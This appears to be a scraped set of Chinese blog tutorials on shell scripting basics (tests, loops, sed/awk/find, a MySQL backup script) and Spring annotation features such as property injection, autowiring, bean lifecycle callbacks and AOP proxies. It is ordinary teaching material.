检测文件（包括目录）是否存在，如果是，则返回 true。 [ -e $file ] 返回 true。 创建文件 #!/bin/bash# if test# by authors cuzzDIR=cuzzif [ ! -d $DIR ]; then # 都有空格 mkdir $DIR echo &quot;this $DIR create success.&quot;else echo &quot;this dir is exit.&quot;fi 测试文件是否存在 #!/bin/bash# if test# by authors cuzzfile=test.txtif [ ! -e $file ]; then echo &quot;OK&quot; &gt;&gt; $file # &gt;&gt;是追加内容 &gt;是覆盖内容else cat $filefi mysql备份 #!/bin/bash# auto backup mysql db# by authors cuzz# define backup pathBAK_DIR=/data/backup/`date +%Y%m%d` # 反引号可以把里面当作命令来解析 # mysqlMYSQLDB=testMYSQLUSER=rootMYSQLPW=123456MYSQLCMD=/usr/bin/mysqldump # 备份命令# 判断是否是rootif [ $UID -ne 0 ]; then echo &quot;Only root can execute Shell.&quot; exitfiif [ ! -d $BAK_DIR ]; then mkdir -p $BAK_DIR # -p 父目录不存在就创建 echo &quot;The $BAK_DIR create success.&quot;else echo &quot;This $BAK_DIR is exist.&quot;fi# mysql backup command$MYSQLCMD -u$MYSQLUSER -p$MYSQLPW -d $MYSQLDB &gt;$BAK_DIR/$MYSQLDB.sqlif [ $? -eq 0 ]; then echo &quot;backup success.&quot;else echo &quot;backup fail.&quot;fi Shell编程之for循环基本语句 #!/bin/bashfor i in `seq 1 15`do echo &quot;the number is $i.&quot;done 求和 #!/bin/bashsum=0for ((i=1; i&lt;=100; i++)) # 双括号用于运算相当与其他语言的单括号do sum=`expr $sum + $i` # expr用于计算doneecho &quot;$sum&quot; 打包，只能打包到最后一个，后面的会把前面的覆盖了 #!/bin/bashfor file in `find ./ -name &quot;*.sh&quot;`do tar -czf all.tgz $filedone Shell编程之while循环使用 #!/bin/bashi=0while [[ $i -lt 10 ]] # (( $i &lt; 10))是一样的do echo &quot;$i&quot; ((i++))done 结合read使用 #!/bin/bashwhile read line # 把读取的东西赋值给linedo echo $linedone &lt;/etc/hosts # 从哪里读取 Shell编程之数组Shell 数组用括号来表示，元素用”空格”符号分割开，语法格式如下： my_array=(A B &quot;C&quot; D) # 定义数组array_name[0]=value0 # 使用下标来定义array_name[1]=value1array_name[2]=value2${array_name[0]} # 读取第一个元素${my_array[*]} # 读取所有元素 ${my_array[@]} # 读取所有元素${#my_array[*]} # 读取数组长度${#my_array[@]} # 读取数组长度 Shell编程之函数无返回值得函数 sayHello(){ # 定义函数一 echo &quot;hello&quot;}function sayHelloWorld(){ # 定义函数二 echo &quot;hello world&quot;}sayhell # 使用函数 有返回值得，使用return只能返回0-255 function sum(){ returnValue=$(( $1 + $2 )) return $returnValue}sum 22 4echo $? 可以使用echo来传递参数 function length(){ str=$1 result=0 if [ &quot;$str&quot; != &quot;&quot; ] ; then result=${#str} fi echo &quot;$result&quot;}len=$(length &quot;abc123&quot;) # 调用echo &quot;The string's length is $len &quot; Shell编程之sed命令把test.txt中的old修改为new，要使用-i才能插入 &gt; sed -i 's/old/new/s' test.txt 在每行行前面添加一个cuzz &gt; sed -i sed 's/^/&amp;cuzz/g' test.txt 在每行的末尾添加一个cuzz &gt; sed -i 's/$/&amp; cuzz/g' test.txt 匹配某一行，在下方插入一行，找到cuzz这行在下方插入#### &gt; sed '/cuzz/a #######' test.txt 在之前添加一行，只要把a改成i &gt; sed '/cuzz/i #######' test.txt 打印 &gt; sed -n '/cuzz/p' test.txt # 打印含有cuzz这一行&gt; sed -n '1p' test.txt # 打印第一行&gt; sed -n '1,5p' text.txt # 打印1到5行 查找最大和最小值 number.txt 12 324 56 0034 -23 345345 349- 245 345 345 0989 0459 -25 命令 cat number.txt | sed 's/ /\\n/g' | grep -v &quot;^$&quot; | sort -nr | sed -n '1p;$p'sed 's/ /\\n/g' # 把所有空格换成换行grep -v &quot;^$&quot; # 去掉所有空格sort -nr # 降序排列sed -n '1p;$p # 找出第1行和最后一行 Shell编程之grep命令 -a ：将 binary 文件以 text 文件的方式搜寻数据 -c ：计算找到 ‘搜寻字符串’ 的次数 -i ：忽略大小写的不同，所以大小写视为相同 -n ：顺便输出行号 -v ：反向选择，亦即显示出没有 ‘搜寻字符串’ 内容的那一行 –color=auto ：可以将找到的关键词部分加上颜色的显示 egrep 和grep -E 相同，可以使用正则表达式 Shell编程之awk命令# 每行按空格或TAB分割cat test.txt | awk '{print $1}' # 行匹配语句 awk '' 只能用单引号# 指定分割awk -F #-F相当于内置变量FS, 指定分割字符cat test.txt | awk -F: '{print $1}' # 以分号分割# 指定添加某些内容cat test.txt | awk -F: '{print &quot;haha&quot; $1}' # 提前出来再添加haha Shell编程之find命令基本命令 find /dir -name &quot;test.txt&quot; # 在/dir目录下查找find . -name &quot;test.txt&quot; # 在当前目录下找 find . -maxdepth 1 -name &quot;text.txt&quot; # 只遍历一层find . -type f -name &quot;text&quot; # 指定类型find . -name &quot;text&quot; -mtime -1 # 指定时间find . -size +20M # 指定大小 查找并执行其他命令 find . -name &quot;text.txt&quot; -exec rm -rf {} \\; # 后面{} \\是固定格式","link":"/2018/10/04/Shell%E5%85%A5%E9%97%A8/"},{"title":"Spring注解驱动开发（三）","text":"The Spring Framework provides a comprehensive programming and configuration model for modern Java-based enterprise applications - on any kind of deployment platform. 属性赋值@value赋值使用@Value赋值 基本数值 可以写SPEL表达式 #{} 可以${}获取配置文件信息（在运行的环境变量中的值） 使用xml时候导入配置文件是 &lt;context:property-placeholder location=&quot;classpath:person.properties&quot;/&gt; 使用注解可以在配置类添加一个@PropertySource注解把配置文件中k/v保存到运行的环境中 使用${key}来获取 /** * @Author: cuzz * @Date: 2018/9/24 18:43 * @Description: */@PropertySource(value = {&quot;classpath:/person.properties&quot;})@Configurationpublic class MainConfigOfPropertyValue { @Bean public Person person() { return new Person(); }} Person 类 @Datapublic class Person { @Value(&quot;vhuj&quot;) private String name; @Value(&quot;#{20-2}&quot;) private Integer age; @Value(&quot;${person.nickName}&quot;) private String nickName;} 测试 @Testpublic void test01() { printBean(applicationContext); System.out.println(&quot;---------------------------&quot;); Person person = (Person) applicationContext.getBean(&quot;person&quot;); System.out.println(person); System.out.println(&quot;---------------------------&quot;);} 输出 ---------------------------Person(name=vhuj, age=18, nickName=三三)--------------------------- 自动装配@Autowired@Qualifier@Primary自动转配： Spring利用依赖注入（DI），完成对IOC容器中各个组件的依赖关系赋值 @Autowired自动注入: a. 默认优先按照类型去容器中寻找对应的组件，如果找到去赋值 b. 如果找到到相同类型的组件，再将属性名（BookDao bookdao）作为组件的id去容器中查找 c. 接下来还可以使用@Qualifier(&quot;bookdao&quot;)明确指定需要装配的id d. 默认是必须的，我们可以指定 @Autowired(required=false)，指定非必须 @Primary让Spring自动装配时首先装配 自动装配@Resource和@InjectSpring还支持使用@Resource (JSR250) 和@Inject (JSR330) 注解，这两个是java规范 @Resource和@Autowired一样实现自动装配功能，默认是按组件名称进行装配的 没有支持@Primary和@Autowird(required=false)的功能 自动装配其他地方的自动装配@Autowired：构造器、参数、方法属性等 标注到方法位子上@Bean+方法参数，参数从容器中获取 /** * @Author: cuzz * @Date: 2018/9/24 20:57 * @Description: */public class Boss { // 属性 @Autowired private Car car; // 构造器 如果构造器只有一个有参构造器可以省略 @Autowired public Boss(@Autowired Car car) { } public Car getCar() { return car; } // set方法 @Autowired // 参数 public void setCar(@Autowired Car car) { this.car = car; }} 自动装配Aware注入Spring底层注解自定义组件想要使用Spring容器底层的一些组件（ApplicationContext，BeanFactory 等等），自定义组件实现xxxAware，在创建对象的时候会调用接口规定的方法注入相关的组件 /** * Marker superinterface indicating that a bean is eligible to be * notified by the Spring container of a particular framework object * through a callback-style method. Actual method signature is * determined by individual subinterfaces, but should typically * consist of just one void-returning method that accepts a single * argument. */public interface Aware {} 我们实现几个常见的Aware接口 /** * @Author: cuzz * @Date: 2018/9/25 10:18 * @Description: */@Componentpublic class Red implements BeanNameAware ,BeanFactoryAware, ApplicationContextAware { private ApplicationContext applicationContext; @Override public void setBeanName(String name) { System.out.println(&quot;当前Bean的名字: &quot; + name); } @Override public void setBeanFactory(BeanFactory beanFactory) throws BeansException { System.out.println(&quot;当前的BeanFactory: &quot; + beanFactory); } @Override public void setApplicationContext(ApplicationContext applicationContext) throws BeansException { this.applicationContext = applicationContext; System.out.println(&quot;传入的ioc: &quot; + applicationContext); }} 注入到配置中测试 /** * @Author: cuzz * @Date: 2018/9/25 10:28 * @Description: */public class IOCTestAware { @Test public void test01() { AnnotationConfigApplicationContext applicationContext = new AnnotationConfigApplicationContext(MainConfigOfAware.class); }} 测试结果 当前Bean的名字: red当前的BeanFactory: org.springframework.beans.factory.support.DefaultListableBeanFactory@159c4b8: defining beans [org.springframework.context.annotation.internalConfigurationAnnotationProcessor,org.springframework.context.annotation.internalAutowiredAnnotationProcessor,org.springframework.context.annotation.internalRequiredAnnotationProcessor,org.springframework.context.annotation.internalCommonAnnotationProcessor,org.springframework.context.event.internalEventListenerProcessor,org.springframework.context.event.internalEventListenerFactory,mainConfigOfAware,red]; root of factory hierarchy传入的ioc: org.springframework.context.annotation.AnnotationConfigApplicationContext@1e89d68: startup date [Tue Sep 25 10:29:17 CST 2018]; root of context hierarchy 把Spring自定义组件注入到容器中 原理： public interface ApplicationContextAware extends Aware {} 通过 Debug 方式，定位到 org.springframework.context.support.ApplicationContextAwareProcessor#postProcessBeforeInitialization @Overridepublic Object postProcessBeforeInitialization(final Object bean, String beanName) throws BeansException { AccessControlContext acc = null; if (System.getSecurityManager() != null &amp;&amp; (bean instanceof EnvironmentAware || bean instanceof EmbeddedValueResolverAware || bean instanceof ResourceLoaderAware || bean instanceof ApplicationEventPublisherAware || bean instanceof MessageSourceAware || bean instanceof ApplicationContextAware)) { acc = this.applicationContext.getBeanFactory().getAccessControlContext(); } if (acc != null) { AccessController.doPrivileged(new PrivilegedAction&lt;Object&gt;() { @Override public Object run() { invokeAwareInterfaces(bean); return null; } }, acc); } else { invokeAwareInterfaces(bean); // 调用 } 调用下面方法进行判断，每种 xxxAware 接口中只有一种方法，并调用相应的方法 private void invokeAwareInterfaces(Object bean) { if (bean instanceof Aware) { if (bean instanceof EnvironmentAware) { ((EnvironmentAware) bean).setEnvironment(this.applicationContext.getEnvironment()); } if (bean instanceof EmbeddedValueResolverAware) { ((EmbeddedValueResolverAware) bean).setEmbeddedValueResolver(this.embeddedValueResolver); } if (bean instanceof ResourceLoaderAware) { ((ResourceLoaderAware) bean).setResourceLoader(this.applicationContext); } if (bean instanceof ApplicationEventPublisherAware) { ((ApplicationEventPublisherAware) bean).setApplicationEventPublisher(this.applicationContext); } if (bean instanceof MessageSourceAware) { ((MessageSourceAware) bean).setMessageSource(this.applicationContext); } if (bean instanceof ApplicationContextAware) { ((ApplicationContextAware) bean).setApplicationContext(this.applicationContext); } }} xxxAware都是通过xxxProcessor来处理的 比如：ApplicationContextAware 对应 ApplicationContextAwareProcessor 自动装配@Profile环境搭建Profile是Spring为我们提供可以根据当前环境，动态的激活和切换一系组件的功能 a. 使用命令动态参数激活：虚拟机参数位子加载 -Dspring.profiles.active=test b. 使用代码激活环境 我们想配置类 /** * @Author: cuzz * @Date: 2018/9/25 10:47 * @Description: */@Configurationpublic class MainConfigOfProfile { @Profile(value = &quot;test&quot;) @Bean(value = &quot;testDataSource&quot;) public DataSource testDataSource() { System.out.println(&quot;testDataSource&quot;); return null; } @Profile(value = &quot;dev&quot;) @Bean(value = &quot;devDataSource&quot;) public DataSource devDataSource() { System.out.println(&quot;devDataSource&quot;); return null; }} 测试 /** * @Author: cuzz * @Date: 2018/9/25 10:59 * @Description: */public class IOCTestProfile { @Test public void test01() { // 1. 使用无参构造器创建一个applicationContext AnnotationConfigApplicationContext applicationContext = new AnnotationConfigApplicationContext(); // 2. 设置要激活的环境 applicationContext.getEnvironment().setActiveProfiles(&quot;test&quot;); // 3. 注册主配置类 applicationContext.register(MainConfigOfProfile.class); // 4. 启动刷新容器 applicationContext.refresh(); }} 输出 testDataSource","link":"/2018/09/25/Spring%E6%B3%A8%E8%A7%A3%E9%A9%B1%E5%8A%A8%E5%BC%80%E5%8F%91%EF%BC%88%E4%B8%89%EF%BC%89/"},{"title":"Spring注解驱动开发（四）","text":"AOP面向切面编程AOP（Aspect Oriented Programming），即面向切面编程，可以说是OOP（Object Oriented Programming，面向对象编程）的补充和完善。OOP引入封装、继承、多态等概念来建立一种对象层次结构，用于模拟公共行为的一个集合。不过OOP允许开发者定义纵向的关系，但并不适合定义横向的关系，例如日志功能。日志代码往往横向地散布在所有对象层次中，而与它对应的对象的核心功能毫无关系对于其他类型的代码，如安全性、异常处理和透明的持续性也都是如此，这种散布在各处的无关的代码被称为横切（cross cutting），在OOP设计中，它导致了大量代码的重复，而不利于各个模块的重用。 底层实现Spring 的 AOP 的底层用到两种代理机制： JDK 的动态代理 ：类必须实现接口，所以是针对实现了接口的类产生代理. Cglib 的动态代理：针对没有实现接口的类产生代理，应用的是底层的字节码增强的技术生成当前类的子类对象 JDK 的动态代理 UserService接口，实现增删改查的功能 package com.cuzz.service;public interface UserService { void add(); void delete(); void update(); void get();} UserService接口的实现的类 public class UserServiceImpl implements UserService { @Override public void add() { System.out.println(&quot;添加一个user&quot;); } @Override public void delete() { System.out.println(&quot;删除一个user&quot;); } @Override public void update() { System.out.println(&quot;更新一个user&quot;); } @Override public void get() { System.out.println(&quot;查询一个user&quot;); }} 实现动态代理 package com.cuzz.service;import java.lang.reflect.InvocationHandler;import java.lang.reflect.Method;import java.lang.reflect.Proxy;public class UserServiceProxyFactory implements InvocationHandler{ private UserService us; public UserServiceProxyFactory(UserService us) { super(); this.us = us; } // 获得动态代理 public UserService getUserServiceProxy() { // 生成动态代理 UserService usProxy = (UserService) Proxy.newProxyInstance(UserServiceProxyFactory.class.getClassLoader(), UserServiceImpl.class.getInterfaces(), this); // 这个 this 就是实现 InvocationHandler 的对象 return usProxy; } @Override public Object invoke(Object arg0, Method method, Object[] arg2) throws Throwable { System.out.println(&quot;打开事务!&quot;); Object invoke = method.invoke(us, arg2); System.out.println(&quot;提交事务!&quot;); return invoke; }} 测试 public class TestDemo { @Test public void test01(){ UserService us = new UserServiceImpl(); UserServiceProxyFactory factory = new UserServiceProxyFactory(us); UserService usProxy = factory.getUserServiceProxy(); usProxy.add(); }} 输出 打开事务!添加一个user提交事务! Cglib 的动态代理 Cglib 的动态代理的代码实现 package com.cuzz.service;import java.lang.reflect.Method;import org.springframework.cglib.proxy.Enhancer;import org.springframework.cglib.proxy.MethodInterceptor;import org.springframework.cglib.proxy.MethodProxy;public class UserServiceProxyFactory2 implements MethodInterceptor { public UserService getUserServiceProxy(){ // 帮我们生成代理对象 Enhancer en = new Enhancer(); // 设置对谁进行代理 en.setSuperclass(UserServiceImpl.class); // 代理要做什么 en.setCallback(this); // 创建代理对象 UserService us = (UserService) en.create(); return us; } @Override public Object intercept(Object prxoyobj, Method method, Object[] arg, MethodProxy methodProxy) throws Throwable { // 打开事务 System.out.println(&quot;打开事务!&quot;); // 调用原有方法 Object returnValue = methodProxy.invokeSuper(prxoyobj, arg); // 提交事务 System.out.println(&quot;提交事务!&quot;); return returnValue; }} 测试 @Testpublic void test02() { UserServiceProxyFactory2 factory = new UserServiceProxyFactory2(); UserService usProxy = factory.getUserServiceProxy(); usProxy.add();} Spring的AOP开发(基于AspectJ)AOP的开发中的相关术语： Joinpoint(连接点)：所谓连接点是指那些被拦截到的点，在 spring 中这些点指的是方法，因为 spring 只支持方法类型的连接点 Pointcut(切入点)：所谓切入点是指我们要对哪些 Joinpoint 进行拦截的定义 Advice(通知/增强)：所谓通知是指拦截到 Joinpoint 之后所要做的事情就是通知.通知分为前置通知,后置通知,异常通知,最终通知,环绕通知(切面要完成的功能) Introduction(引介)：引介是一种特殊的通知在不修改类代码的前提下, Introduction 可以在运行期为类动态地添加一些方法或 Field Target(目标对象)：代理的目标对象 Weaving(织入)：是指把增强应用到目标对象来创建新的代理对象的过程，spring 采用动态代理织入，而 AspectJ 采用编译期织入和类装在期织入 Proxy（代理）：一个类被 AOP 织入增强后，就产生一个结果代理类 Aspect(切面)：是切入点和通知（引介）的结合 通知类型 前置通知 ：在目标方法执行之前执行 后置通知 ：在目标方法执行之后执行 环绕通知 ：在目标方法执行前和执行后执行 异常抛出通知：在目标方法执行出现异常的时候执行 最终通知 ：无论目标方法是否出现异常 最终通知都会执行 代码演示通知类，给切面的目标方法标注何时地运行，必须告诉 Spring 哪个类是切面类，添加注解 @Aspect @Aspect // 表示该类是一个通知类public class MyAdvice { // 前置通知 @Before(&quot;execution(* com.cuzz.service..*ServiceImpl.*(..))&quot;) public void before(){ System.out.println(&quot;这是前置通知!!&quot;); } // 后置通知 @AfterReturning(&quot;execution(* com.cuzz.service..*ServiceImpl.*(..))&quot;) public void afterReturning(){ System.out.println(&quot;这是后置通知(如果出现异常不会调用)!!&quot;); } // 环绕通知 @Around(&quot;execution(* com.cuzz.service..*ServiceImpl.*(..))&quot;) public Object around(ProceedingJoinPoint pjp) throws Throwable { System.out.println(&quot;这是环绕通知之前的部分!!&quot;); // 调用目标方法 Object proceed = pjp.proceed(); System.out.println(&quot;这是环绕通知之后的部分!!&quot;); return proceed; } // 异常通知 @AfterThrowing(&quot;execution(* com.cuzz.service..*ServiceImpl.*(..))&quot;) public void afterException(){ System.out.println(&quot;出事啦!出现异常了!!&quot;); } // 后置通知 @After(&quot;execution(* com.cuzz.service..*ServiceImpl.*(..))&quot;) public void after(){ System.out.println(&quot;这是后置通知(出现异常也会调用)!!&quot;); }} 配置类，将切面类和业务逻辑类都加入到容器中，给配置类加 @EnableAspectJAutoProxy 注解 /** * @Author: cuzz * @Date: 2019/2/10 20:43 * @Description: */@Configuration@EnableAspectJAutoProxypublic class MainConfigOfAOP { @Bean public UserService userService() { return new UserServiceImpl(); } @Bean public MyAdvice myAdvice() { return new MyAdvice(); }} 测试 @Testpublic void test03() { AnnotationConfigApplicationContext applicationContext = new AnnotationConfigApplicationContext(MainConfigOfAOP.class); UserService userService = (UserService) applicationContext.getBean(&quot;userService&quot;); userService.add(); userService.delete(); userService.update(); userService.get();} 如果报错添加依赖 &lt;dependency&gt; &lt;groupId&gt;org.aspectj&lt;/groupId&gt; &lt;artifactId&gt;aspectjweaver&lt;/artifactId&gt; &lt;version&gt;1.8.4&lt;/version&gt; &lt;/dependency&gt;","link":"/2019/02/10/Spring%E6%B3%A8%E8%A7%A3%E9%A9%B1%E5%8A%A8%E5%BC%80%E5%8F%91%EF%BC%88%E5%9B%9B%EF%BC%89/"},{"title":"Spring注解驱动开发（二）","text":"The Spring Framework provides a comprehensive programming and configuration model for modern Java-based enterprise applications - on any kind of deployment platform. 声明周期@Bean指定初始化和销毁方法Bean的生命周期Bean的创建、初始化和销毁是由容器帮我们管理的 我们可以自定义初始化和销毁方法，容器在进行到当前生命周期的时候来调用我买自定义的初始化和销毁方法 构造（对象创建） ​ 单实例： 在容器启动的时候创建 ​ 多实例： 在每次获取的时候创建对象 指定初始化方法初始化：对象创建完成后，并赋值化，调用初始化方法 销毁：单实例是在容器关闭的时候销毁，多实例容器不会管理这个Bean，容器不会调用销毁方法 编写一个Car类 /** * @Author: cuzz * @Date: 2018/9/23 21:20 * @Description: */public class Car { public Car () { System.out.println(&quot;car constructor...&quot;); } public void init() { System.out.println(&quot;car...init...&quot;); } public void destroy() { System.out.println(&quot;car...destroy...&quot;); }} 在xml中我们可以指定init-method和destroy-method方法，如 &lt;bean id=&quot;car&quot; class=&quot;com.cuzz.bean.Car&quot; init-method=&quot;init&quot; destroy-method=&quot;destroy&quot;&gt;&lt;/bean&gt; 使用注解我们可以 /** * @Author: cuzz * @Date: 2018/9/24 12:49 * @Description: 配置类 */@Configurationpublic class MainConfigOfLifecycle { @Bean(initMethod = &quot;init&quot;, destroyMethod = &quot;destroy&quot;) public Car car() { return new Car(); }} 测试 /** * @Author: cuzz * @Date: 2018/9/24 13:00 * @Description: */public class IOCTestLifeCycle { @Test public void test01() { // 创建ioc容器 AnnotationConfigApplicationContext applicationContext = new AnnotationConfigApplicationContext(MainConfigOfLifecycle.class); System.out.println(&quot;容器创建完成...&quot;); // 关闭容器 System.out.println(&quot;---&gt;开始关闭容器&quot;); applicationContext.close(); System.out.println(&quot;---&gt;已经关闭容器&quot;); }} 可以看出先创建car，再调用init方法，在容器关闭时销毁实例 car constructor...car...init...容器创建完成...---&gt;开始关闭容器car...destroy...---&gt;已经关闭容器 在配置数据源的时候，有很多属性赋值，销毁的时候要把连接给断开 生命周期InitializingBean和DisposableBeanInitializingBean可以通过Bean实现InitializingBean来定义初始化逻辑，是设置好所有属性会调用afterPropertiesSet()方法 public interface InitializingBean { /** * Invoked by a BeanFactory after it has set all bean properties supplied * (and satisfied BeanFactoryAware and ApplicationContextAware). * &lt;p&gt;This method allows the bean instance to perform initialization only * possible when all bean properties have been set and to throw an * exception in the event of misconfiguration. * @throws Exception in the event of misconfiguration (such * as failure to set an essential property) or if initialization fails. */ void afterPropertiesSet() throws Exception;} DisposableBean可以通过Bean实现DisposableBean来定义销毁逻辑，会调用destroy()方法 public interface DisposableBean { /** * Invoked by a BeanFactory on destruction of a singleton. * @throws Exception in case of shutdown errors. * Exceptions will get logged but not rethrown to allow * other beans to release their resources too. */ void destroy() throws Exception;} 例子编写一个Cat类 /** * @Author: cuzz * @Date: 2018/9/24 13:36 * @Description: */public class Cat implements InitializingBean, DisposableBean{ public Cat() { System.out.println(&quot;cat constructor...&quot;); } @Override public void afterPropertiesSet() throws Exception { System.out.println(&quot;cat...init...&quot;); } @Override public void destroy() throws Exception { System.out.println(&quot;cat...destroy...&quot;); }} 测试 cat constructor...cat...init...容器创建完成...---&gt;开始关闭容器cat...destroy...---&gt;已经关闭容器 生命周期@PostContruct和@PreDestroy注解@PostContruct在Bean创建完成并且属性赋值完成，来执行初始化 @PreDestroy在容器销毁Bean之前通知我们进行清理工作 编写一个Dog类，并把他注入到配置类中 /** * @Author: cuzz * @Date: 2018/9/24 14:03 * @Description: */public class Dog { public Dog() { System.out.println(&quot;dog constructor...&quot;); } @PostConstruct public void postConstruct() { System.out.println(&quot;post construct...&quot;); } @PreDestroy public void preDestroy() { System.out.println(&quot;pre destroy...&quot;); }} 测试结果 dog constructor...post construct...容器创建完成...---&gt;开始关闭容器pre destroy...---&gt;已经关闭容器 生命周期BeanPostProscessor后置处理器我们先看看源码，解释的很清楚，BeanPostProscessor 中postProcessBeforeInitialization方法会在每一个bean对象的初始化方法调用之前回调；postProcessAfterInitialization方法会在每个bean对象的初始化方法调用之后被回调 。 /** * Factory hook that allows for custom modification of new bean instances, * e.g. checking for marker interfaces or wrapping them with proxies. * * &lt;p&gt;ApplicationContexts can autodetect BeanPostProcessor beans in their * bean definitions and apply them to any beans subsequently created. * Plain bean factories allow for programmatic registration of post-processors, * applying to all beans created through this factory. * * &lt;p&gt;Typically, post-processors that populate beans via marker interfaces * or the like will implement {@link #postProcessBeforeInitialization}, * while post-processors that wrap beans with proxies will normally * implement {@link #postProcessAfterInitialization}. */public interface BeanPostProcessor { /** * Apply this BeanPostProcessor to the given new bean instance &lt;i&gt;before&lt;/i&gt; any bean * initialization callbacks (like InitializingBean's {@code afterPropertiesSet} * or a custom init-method). The bean will already be populated with property values. * The returned bean instance may be a wrapper around the original. * @param bean the new bean instance * @param beanName the name of the bean * @return the bean instance to use, either the original or a wrapped one; * if {@code null}, no subsequent BeanPostProcessors will be invoked * @throws org.springframework.beans.BeansException in case of errors * @see org.springframework.beans.factory.InitializingBean#afterPropertiesSet */ Object postProcessBeforeInitialization(Object bean, String beanName) throws BeansException; /** * Apply this BeanPostProcessor to the given new bean instance &lt;i&gt;after&lt;/i&gt; any bean * initialization callbacks (like InitializingBean's {@code afterPropertiesSet} * or a custom init-method). The bean will already be populated with property values. * The returned bean instance may be a wrapper around the original. * &lt;p&gt;In case of a FactoryBean, this callback will be invoked for both the FactoryBean * instance and the objects created by the FactoryBean (as of Spring 2.0). The * post-processor can decide whether to apply to either the FactoryBean or created * objects or both through corresponding {@code bean instanceof FactoryBean} checks. * &lt;p&gt;This callback will also be invoked after a short-circuiting triggered by a * {@link InstantiationAwareBeanPostProcessor#postProcessBeforeInstantiation} method, * in contrast to all other BeanPostProcessor callbacks. * @param bean the new bean instance * @param beanName the name of the bean * @return the bean instance to use, either the original or a wrapped one; * if {@code null}, no subsequent BeanPostProcessors will be invoked * @throws org.springframework.beans.BeansException in case of errors * @see org.springframework.beans.factory.InitializingBean#afterPropertiesSet * @see org.springframework.beans.factory.FactoryBean */ Object postProcessAfterInitialization(Object bean, String beanName) throws BeansException;} 编写一个MyBeanPostProcessor实现BeanPostProcessor接口 /** * @Author: cuzz * @Date: 2018/9/24 14:21 * @Description: 后置处理器，初始化前后进行处理工作 */public class MyBeanPostProcessor implements BeanPostProcessor{ @Override public Object postProcessBeforeInitialization(Object bean, String beanName) throws BeansException { System.out.println(&quot;---&gt;postProcessBeforeInitialization...&quot; + beanName +&quot;==&gt;&quot; + bean); return bean; } @Override public Object postProcessAfterInitialization(Object bean, String beanName) throws BeansException { System.out.println(&quot;---&gt;postProcessAfterInitialization...&quot; + beanName +&quot;==&gt;&quot; + bean); return bean; }} 添加到配置中 @Configurationpublic class MainConfigOfLifecycle { @Bean public Cat cat() { return new Cat(); } @Bean public MyBeanPostProcessor myBeanPostProcessor() { return new MyBeanPostProcessor(); }} 测试 ---&gt;postProcessBeforeInitialization...org.springframework.context.event.internalEventListenerProcessor==&gt;org.springframework.context.event.EventListenerMethodProcessor@1dc67c2---&gt;postProcessAfterInitialization...org.springframework.context.event.internalEventListenerProcessor==&gt;org.springframework.context.event.EventListenerMethodProcessor@1dc67c2---&gt;postProcessBeforeInitialization...org.springframework.context.event.internalEventListenerFactory==&gt;org.springframework.context.event.DefaultEventListenerFactory@2bd765---&gt;postProcessAfterInitialization...org.springframework.context.event.internalEventListenerFactory==&gt;org.springframework.context.event.DefaultEventListenerFactory@2bd765cat constructor...---&gt;postProcessBeforeInitialization...cat==&gt;com.cuzz.bean.Cat@1d3b207cat...init...---&gt;postProcessAfterInitialization...cat==&gt;com.cuzz.bean.Cat@1d3b207容器创建完成...---&gt;开始关闭容器cat...destroy...---&gt;已经关闭容器 在实例创建之前后创建之后会被执行 生命周期BeanPostProcessor原理通过debug到populateBean，先给属性赋值在执行initializeBean方法 try { populateBean(beanName, mbd, instanceWrapper); if (exposedObject != null) { exposedObject = initializeBean(beanName, exposedObject, mbd); }} initializeBean方法时， protected Object initializeBean(final String beanName, final Object bean, RootBeanDefinition mbd) { Object wrappedBean = bean; if (mbd == null || !mbd.isSynthetic()) { // 执行before方法 wrappedBean = applyBeanPostProcessorsBeforeInitialization(wrappedBean, beanName); } ... try { // 执行初始化 invokeInitMethods(beanName, wrappedBean, mbd); } if (mbd == null || !mbd.isSynthetic()) { // 执行after方法 wrappedBean = applyBeanPostProcessorsAfterInitialization(wrappedBean, beanName); } return wrappedBean;} Spring底层对BeanPostProcessor的使用： Bean赋值、注入其他组件、@Autowired、生命周期注解功能、@Async等等都使用到了BeanPostProcessor这个接口的实现类，很重要 总结Bean 的初始化顺序 首先执行 bean 的构造方法 BeanPostProcessor 的 postProcessBeforeInitialization 方法 InitializingBean 的 afterPropertiesSet 方法 @Bean 注解的 initMethod方法 BeanPostProcesso r的 postProcessAfterInitialization 方法 DisposableBean 的 destroy 方法 @Bean注解的 destroyMethod 方法","link":"/2018/09/24/Spring%E6%B3%A8%E8%A7%A3%E9%A9%B1%E5%8A%A8%E5%BC%80%E5%8F%91%EF%BC%88%E4%BA%8C%EF%BC%89/"},{"title":"Spring 的复杂类型注入","text":"Spring 的类型注入先定义一个接口： public interface Animal {} 对应的有一些实现类： @Componentpublic class Dog implements Animal {}@Component(&quot;myCat&quot;)public class Cat implements Animal {} 我们用 Spring 比较常见的用类型注入和名称注入： @Resourceprivate Dog dog; // 按类型注入@Resource(&quot;myCat&quot;)private Cat myCat; // 按名称注入 然后今天在公司看到同事使用观察者模式的时候，使用了另外一种注入方式，注入的是List&lt;XXX&gt;： @Resourceprivate List&lt;Animal&gt; animalList; 这个时候注入的时候实现 Animal 这个接口的所有实现类 Spring 按类型自动注入Array、List、Set、MapSpring 按类型不仅仅注入类本身的，而且还可以注入Array、List、Set 和 Map 。 @Resourceprivate Animal[] animalArr;@Resourceprivate List&lt;Animal&gt; animalList;@Resourceprivate Set&lt;Animal&gt; animalSet;@Resourceprivate Map&lt;String, Animal&gt; animalMap; 我们写一个测试类看看： @Autowiredprivate void print() { System.out.println(Arrays.toString(animalArr)); System.out.println(animalList); System.out.println(animalSet); System.out.println(animalMap);} 发现输出： [com.cuzz.spring.impl.Cat@58cd06cb, com.cuzz.spring.impl.Dog@3be8821f][com.cuzz.spring.impl.Cat@58cd06cb, com.cuzz.spring.impl.Dog@3be8821f][com.cuzz.spring.impl.Cat@58cd06cb, com.cuzz.spring.impl.Dog@3be8821f]{myCat=com.cuzz.spring.impl.Cat@58cd06cb, dog=com.cuzz.spring.impl.Dog@3be8821f} 当为数组和集合的时候会把所有接口的实现类放入其中，当为 Map 时，key 对应的是 Bean 的名称，value 对应Bean。 源码分析先定位到这个方法org.springframework.beans.factory.support.DefaultListableBeanFactory#resolveDependency resolveDependency 方法中定位到根据类型查找依赖 doResolveDependency。 @Override@Nullablepublic Object resolveDependency(DependencyDescriptor descriptor, @Nullable String requestingBeanName, @Nullable Set&lt;String&gt; autowiredBeanNames, @Nullable TypeConverter typeConverter) throws BeansException { // ... Object result = getAutowireCandidateResolver().getLazyResolutionProxyIfNecessary( descriptor, requestingBeanName); if (result == null) { result = doResolveDependency(descriptor, requestingBeanName, autowiredBeanNames, typeConverter); } return result; }} doResolveDependency 封装了依赖查找的各种情况，我们主要看 resolveMultipleBeans 方法。 